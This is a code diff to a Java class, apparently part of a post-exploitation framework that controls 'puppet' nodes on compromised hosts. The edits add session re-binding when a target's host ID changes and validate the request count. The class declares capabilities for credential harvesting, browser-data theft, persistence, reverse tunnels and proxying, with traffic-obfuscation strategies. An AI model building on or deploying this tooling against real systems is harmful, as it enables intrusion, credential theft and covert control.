@@ -2,6 +2,7 @@ package org.leo.core.puppet.impl;
 
 import org.leo.core.engine.proxy.NetworkProxyManager;
 import org.leo.core.engine.socks5.Socks5ProxyStatistics;
+import org.leo.core.entity.Puppet;
 import org.leo.core.net.Communication;
 import org.leo.core.net.layer.RequestLayer;
 import org.leo.core.net.layer.ResponseLayer;
@@ -47,20 +48,26 @@ import org.leo.core.puppet.capability.TerminalCapable;
 import org.leo.core.puppet.capability.UserAccountCapable;
 import org.leo.core.puppet.capability.WifiProfileCapable;
 import org.leo.core.puppet.service.*;
+import org.leo.core.rpc.PuppetRpcErrorCodes;
 import org.leo.core.util.request.ComponentClassNameStrategy;
 
+import java.lang.reflect.Array;
 import java.util.ArrayList;
+import java.util.Collection;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.Objects;
 import java.util.Set;
+import java.util.function.Consumer;
 
 public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapable, TerminalCapable, FileCapable, NetworkInfoCapable, DiskCapable, SqlCapable, ScriptCapable, ResourceCapable, ClipboardCapable, BrowserDataCapable, HttpSenderCapable, ProcessCapable, RegistryCapable, ScheduledTaskCapable, ServiceCapable, EventLogCapable, UserAccountCapable, FirewallCapable, NetworkConnectionCapable, NetworkShareCapable, InstalledSoftwareCapable, WifiProfileCapable, PersistenceCapable, DockerCapable, SuidCapabilityCapable, HttpProxyCapable, LocalForwardCapable, ReverseTunnelCapable, Socks5ProxyCapable, ScanCapable, ComponentInvokeCapable, ComponentManageCapable, WebRuntimeManageCapable, JavaPluginCapable, CredentialHarvestCapable, HostScopedCapable, LoadedComponentCacheCapable {
 
-    private int maxReqCount;
+    /** 最大请求总数，包含首次请求。 */
+    private int maxReqCount = Puppet.DEFAULT_MAX_REQUEST_COUNT;
 
     List<RequestLayer> requestLayers = new ArrayList<>();
     List<ResponseLayer> responseLayers = new ArrayList<>();
@@ -103,7 +110,8 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     NetworkConnectionService networkConnectionService;
     MountDiskService mountDiskService;
     ClipboardService clipboardService;
-    String hostId;
+    private volatile String hostId;
+    private volatile Consumer<String> hostIdChangeListener = ignored -> { };
 
     private Communication communication;
     private final NetworkProxyManager networkProxyManager = new NetworkProxyManager(this);
@@ -130,6 +138,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     }
 
 
+    @Override
     public String getHostId() {
         return hostId;
     }
@@ -137,8 +146,15 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
     @Override
     public void setHostId(String hostId) {
+        String previous = this.hostId;
         this.hostId = hostId;
         serviceRegistry.setHostId(hostId);
+        if (!Objects.equals(previous, hostId)) hostIdChangeListener.accept(hostId);
+    }
+
+    @Override
+    public void setHostIdChangeListener(Consumer<String> listener) {
+        this.hostIdChangeListener = listener == null ? ignored -> { } : listener;
     }
 
     public synchronized void initService(){
@@ -188,6 +204,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
                 dockerContainerService, suidCapabilityService, browserDataService,
                 wifiProfileService, persistenceService, networkConnectionService,
                 mountDiskService, clipboardService);
+        serviceRegistry.setHostIdMismatchRecovery(this::recoverHostAffinity);
 
         if (hostId != null) {
             setHostId(hostId);
@@ -201,6 +218,64 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
         applyHeaderNoiseStrategyToAll();
         applyComponentClassNameStrategyToAll();
         applyMaxReqCountToAll();
+    }
+
+    private synchronized Map<String, Object> recoverHostAffinity(String expectedHostId) {
+        if (!Objects.equals(expectedHostId, hostId)) {
+            return reboundResult(expectedHostId, hostId);
+        }
+
+        Map<String, Object> ping = testConnService.testConn();
+        Object code = ping == null ? null : ping.get("code");
+        String newHostId = ping == null ? null : normalizedText(ping.get("hostId"));
+        if (!(code instanceof Number) || ((Number) code).intValue() != 200 || newHostId == null) {
+            Map<String, Object> unavailable = new LinkedHashMap<>();
+            unavailable.put("code", Integer.valueOf(503));
+            unavailable.put("errorCode", PuppetRpcErrorCodes.HOST_ID_UNAVAILABLE);
+            unavailable.put("expectedHostId", expectedHostId);
+            unavailable.put("msg", "目标实例已变化，但重新握手未能获得有效 HostId，请稍后重试");
+            return unavailable;
+        }
+
+        componentLoadRegistry.clear();
+        allLoadedComponent.clear();
+        loadedComponentHostLastSeen.clear();
+        setHostId(newHostId);
+        addLoadedComponent(newHostId, componentNames(ping.get("components")));
+        return reboundResult(expectedHostId, newHostId);
+    }
+
+    private Map<String, Object> reboundResult(String previousHostId, String currentHostId) {
+        Map<String, Object> rebound = new LinkedHashMap<>();
+        rebound.put("code", Integer.valueOf(409));
+        rebound.put("errorCode", PuppetRpcErrorCodes.HOST_ID_REBOUND);
+        rebound.put("previousHostId", previousHostId);
+        rebound.put("hostId", currentHostId);
+        rebound.put("msg", "目标实例已变化，会话已重新绑定，请重试当前操作");
+        return rebound;
+    }
+
+    private Set<String> componentNames(Object value) {
+        Set<String> names = new HashSet<>();
+        if (value instanceof Collection<?> collection) {
+            for (Object item : collection) addComponentName(names, item);
+        } else if (value != null && value.getClass().isArray()) {
+            for (int index = 0; index < Array.getLength(value); index++) {
+                addComponentName(names, Array.get(value, index));
+            }
+        }
+        return names;
+    }
+
+    private void addComponentName(Set<String> names, Object value) {
+        String name = normalizedText(value);
+        if (name != null) names.add(name);
+    }
+
+    private String normalizedText(Object value) {
+        if (value == null) return null;
+        String text = String.valueOf(value).trim();
+        return text.isEmpty() ? null : text;
     }
 
     /**
@@ -314,7 +389,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
 
     public void setMaxReqCount(int maxReqCount) {
-        this.maxReqCount = maxReqCount;
+        this.maxReqCount = Puppet.requireValidMaxRequestCount(maxReqCount);
         applyMaxReqCountToAll();
     }
 
